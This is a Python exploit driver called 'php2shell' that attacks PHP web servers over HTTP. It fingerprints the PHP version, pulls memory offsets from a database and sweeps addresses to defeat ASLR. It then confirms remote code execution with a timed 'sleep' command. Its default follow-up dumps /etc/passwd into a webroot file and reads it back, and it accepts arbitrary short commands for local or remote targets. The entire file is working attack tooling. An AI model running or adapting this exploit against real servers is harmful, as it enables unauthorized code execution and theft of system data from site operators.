#!/usr/bin/env python3
"""
p2s.py -- php2shell, one command.  Works against LOCAL or REMOTE targets over HTTP.
No /out mount, no shared folder, no docker required on the target side.

  python3 p2s.py -u http://TARGET[:port][/path]

What it does, in order:
  1. FINGERPRINT   one request -> PHP version from `X-Powered-By` (or --version).
  2. OFFSETS       2 of the 3 vars (zif, dtor) come from offsets_db.json for that
                   version; the 3rd (htdata) is the per-minor base, SWEPT +-k pages
                   and combined with the pair until the chain lands.
  3. BLIND CHECK   runs `sleep N` (fits the 14-byte carrier) and times the trigger;
                   a ~N s delay == RCE confirmed, with no file written.
  4. PoC DROP      (default, after a positive check) runs `cat /e*/p*` -> dumps
                   /etc/passwd into a `poc` file in the server's working dir (webroot),
                   then reads it back over HTTP as proof. Override with --cmd 'YOURCMD'
                   (whole '<cmd>>poc' must be <=14B) or --cmd '' for id;pwd;whoami.
                   Remote-safe: proof travels over HTTP, nothing is mounted.

Offsets for a build not in the DB: pass --zif/--dtor/--htdata (and --version to skip
fingerprint). --no-poc = blind check only (zero artifacts).
"""
import argparse, json, os, sys, time, urllib.request
from urllib.parse import urlsplit, urlunsplit
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "exploit", "engine"))
import exploit as E  # the vendored engine
DB = os.path.join(HERE, "real-vm", "offsets_db.json")

# ---- dynamic, host-agnostic ASLR gate (same as the shipped patch) -------------
def _chunk_base(raw):
    if len(raw) < 1000: return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x010000000000 <= v < 0x800000000000: c[v & ~0x1FFFFF] += 1
    if not c: return 0
    b, n = c.most_common(1)[0]; return b if n >= 8 else 0
def _libphp_base(raw, d):
    if len(raw) < 16: return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x010000000000 <= p < 0x800000000000): return 0
    if p & 0xFFF != d & 0xFFF: return 0
    b = p - d; return b if b & 0xFFF == 0 else 0
E.chunk_base_from_cookie = _chunk_base
E.libphp_base_from_cookie = _libphp_base

PAGE = 0x1000


def fingerprint(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            xpb = r.headers.get("X-Powered-By", "")
    except Exception as e:
        return None, f"no response ({e})"
    import re
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    return (m.group(1), f"X-Powered-By: {xpb}") if m else \
           (None, f"X-Powered-By: {xpb}" if xpb else "no X-Powered-By (expose_php=Off?)")


def db_candidates(version):
    try:
        entries = json.load(open(DB))["entries"]
    except Exception:
        return []
    usable = [e for e in entries if e.get("zif_offset") and e.get("dtor_offset")
              and e.get("htdata_offset")]
    if not version: return usable
    minor = ".".join(version.split(".")[:2])
    exact = [e for e in usable if e.get("php_version") == version]
    same  = [e for e in usable if e.get("php_version", "").startswith(minor + ".")
             and e not in exact]
    return exact + same


def sweep(base, k):
    yield base
    for i in range(1, k + 1):
        yield base + i * PAGE
        yield base - i * PAGE


def readback_url(target_url, name):
    s = urlsplit(target_url)
    return urlunsplit((s.scheme, s.netloc, "/" + name, "", ""))


def http_get(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except Exception as e:
        code = getattr(e, "code", None)
        return code, ""


def _leak(url, cmd, prof, zif, dtor, htd):
    """Build the chain for one command and obtain the two leaks.
       Returns (ex, htdata_abs, zif_abs) or None if a leak failed."""
    if len(cmd.encode()) > 14:
        raise ValueError(f"command {cmd!r} is {len(cmd.encode())}B > 14-byte carrier")
    t = E.Target(url, timeout=60.0, verbose=False)
    ex = E.Exploit(t, cmd, prof, zif, dtor, htd, huge_mb=12, verbose=False)
    ex.rotate(); chunk = 0
    for _ in range(10):
        chunk = ex.stage1()
        if chunk: break
        ex.rotate()
    if not chunk: return None
    ex.rotate(); libphp = 0
    for _ in range(10):
        libphp = ex.stage2()
        if libphp: break
        ex.rotate()
    if not libphp: return None
    return ex, chunk + htd, libphp + zif


def blind_check(url, prof, zif, dtor, htd, N, retries):
    """Run `sleep N` and time the trigger. (confirmed, max_delay)."""
    r = _leak(url, f"sleep {N}", prof, zif, dtor, htd)
    if not r: return False, 0.0
    ex, htdata, zifa = r
    best = 0.0
    for _ in range(retries):
        ex.rotate(); t0 = time.time()
        try: ex.stage3(htdata, zifa)
        except OSError: pass
        dt = time.time() - t0; best = max(best, dt)
        if dt >= N - 1: return True, best
    return False, best


def drop_shot(url, cmd, prof, zif, dtor, htd, retries, rb_url, expect_fn):
    """Fire one write command, stopping as soon as an HTTP readback matches the
       shot's EXACT expected output -- so an append runs exactly once (no dupes)
       and a stale file can't produce a false positive."""
    r = _leak(url, cmd, prof, zif, dtor, htd)
    if not r: return False, ""
    ex, htdata, zifa = r
    for _ in range(retries):
        ex.rotate()
        try: ex.stage3(htdata, zifa)
        except OSError: pass
        code, body = http_get(rb_url)
        lines = [l for l in body.splitlines() if l.strip()]
        if code == 200 and expect_fn(lines):
            return True, body
    _, body = http_get(rb_url)
    return False, body


def main():
    ap = argparse.ArgumentParser(description="php2shell one-shot: fingerprint->offsets->blind check->poc (local or remote)")
    ap.add_argument("-u", "--url", required=True, help="target, e.g. http://host:8084/ (or .../index.php)")
    ap.add_argument("--sleep", type=int, default=7, help="blind-timing sleep seconds (<=14B carrier)")
    ap.add_argument("--retries", type=int, default=6)
    ap.add_argument("--sweep", type=int, default=2, help="htdata sweep +-N pages around DB base")
    ap.add_argument("--version", help="force PHP version (skip fingerprint)")
    ap.add_argument("--poc-name", default="poc", help="dropped proof filename in the webroot")
    ap.add_argument("--cmd", default="cat /e*/p*",
                    help="run YOUR command and capture it to the poc file "
                    "(whole thing '<cmd>><name>' must be <=14B). "
                    "Default = 'cat /e*/p*' (reads /etc/passwd into poc). "
                    "Pass --cmd '' to use the id;pwd;whoami proof instead.")
    ap.add_argument("--passwd", action="store_true",
                    help="proof mode: run 'cat /e*/p*' -> /etc/passwd into the poc file (explicit alias of the default)")
    ap.add_argument("--no-poc", action="store_true", help="blind check only, write nothing")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0))
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    a = ap.parse_args()
    prof = E.PROFILES["official"]

    # 1. fingerprint
    if a.version:
        ver, note = a.version, "version forced"
    else:
        ver, note = fingerprint(a.url)
    print(f"[1] fingerprint: {note} -> version={ver or 'UNKNOWN'}")

    # 2. candidate offset triples (2 from DB/flags + swept 3rd)
    if a.zif_offset is not None and a.dtor_offset is not None:
        base_ht = a.htdata_offset if a.htdata_offset is not None else prof.htdata_offset
        cands = [("manual flags", a.zif_offset, a.dtor_offset, base_ht)]
    else:
        cands = [((e.get("source") or e.get("php_version", "?")),
                  int(e["zif_offset"], 0), int(e["dtor_offset"], 0),
                  int(e["htdata_offset"], 0)) for e in db_candidates(ver)]
        if a.htdata_offset is not None:
            cands = [(t, z, d, a.htdata_offset) for (t, z, d, _) in cands]
    if not cands:
        print(f"[!] no offsets for version {ver or 'UNKNOWN'} in the DB. "
              f"Pass --zif/--dtor (and --htdata), or add the build to offsets_db.json.")
        return 2
    print(f"[2] offsets: {len(cands)} candidate build(s); htdata swept +-{a.sweep} page(s)")

    # 3. blind check -- find the triple that lands
    locked = None
    N = a.sleep
    for tag, zif, dtor, base_ht in cands:
        for htd in sweep(base_ht, a.sweep):
            print(f"[3] try {tag}: zif={hex(zif)} dtor={hex(dtor)} htdata={hex(htd)} ...", end=" ", flush=True)
            ok, dt = blind_check(a.url, prof, zif, dtor, htd, N, a.retries)
            if ok:
                print(f"RCE CONFIRMED (delay {dt:.1f}s >= {N}s)")
                locked = (tag, zif, dtor, htd); break
            print(f"no ({'delay %.1fs' % dt if dt else 'leak failed'})")
        if locked: break
    if not locked:
        print("[-] not confirmed on any candidate this run (raise --retries/--sweep, "
              "or target may be patched / wrong build).")
        return 1
    tag, zif, dtor, htd = locked

    if a.no_poc:
        print(f"\n[+] DONE: RCE confirmed on {tag} (blind timing only, no artifacts).")
        print(f"    offsets: --zif-offset {hex(zif)} --dtor-offset {hex(dtor)} --htdata-offset {hex(htd)}")
        return 0

    # 4b. FILE-DROP proof: cat /e*/p* (passwd) / your --cmd / id;pwd;whoami -> `poc`, read over HTTP.
    if a.passwd:
        a.cmd = "cat /e*/p*"
    name = a.poc_name
    if len(f"whoami>>{name}".encode()) > 14:
        print("[!] poc-name too long for the 14B carrier; using 'poc'"); name = "poc"
    rb = readback_url(a.url, name)
    if a.cmd:
        # If the command already contains its own pipe/redirect, run it VERBATIM;
        # otherwise capture stdout into the poc file with an appended `>name`.
        if "|" in a.cmd or ">" in a.cmd:
            full = a.cmd
        else:
            full = f"{a.cmd}>{name}"
        if len(full.encode()) > 14:
            print(f"[!] '{full}' is {len(full.encode())}B > 14-byte carrier. "
                  f"Shorten --cmd or use a 1-char --poc-name (e.g. -p p)."); return 2
        base = "\n".join(l for l in http_get(rb)[1].splitlines() if l.strip())
        expect = lambda L, b=base: bool([x for x in L if x.strip()]) and "\n".join(L) != b
        print(f"[4] running your command -> '{full}'")
        shots = [(full, expect)]
    else:
        # default proof: id;pwd;whoami as three truncate/append shots, each <=14B.
        # exact-output predicates so a stale file can't false-positive.
        shots = [
            (f"id>{name}",      lambda L: len(L) == 1 and L[0].startswith("uid=")),
            (f"pwd>>{name}",    lambda L: len(L) == 2 and L[0].startswith("uid=") and L[1].startswith("/")),
            (f"whoami>>{name}", lambda L: len(L) == 3 and L[1].startswith("/") and not L[2].startswith("/")),
        ]
        print(f"[4] dropping proof -> '{name}' in the server cwd (webroot): "
              + " then ".join(f"'{c}'" for c, _ in shots))
    for cmd, expect in shots:
        ok, _ = drop_shot(a.url, cmd, prof, zif, dtor, htd, a.retries, rb, expect)
        if not ok:
            print(f"    [~] shot '{cmd}' not confirmed this run")
    code, body = http_get(rb)
    print(f"\n[+] DONE: RCE confirmed on {tag}.")
    if code == 200 and body.strip():
        print(f"[+] proof file {rb} (HTTP 200):\n----\n{body.strip()}\n----")
    else:
        print(f"[~] '{name}' not web-readable (HTTP {code}); on-box: "
              f"find /var/www -name {name} -exec cat {{}} \\;")
    print(f"    offsets: --zif-offset {hex(zif)} --dtor-offset {hex(dtor)} --htdata-offset {hex(htd)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
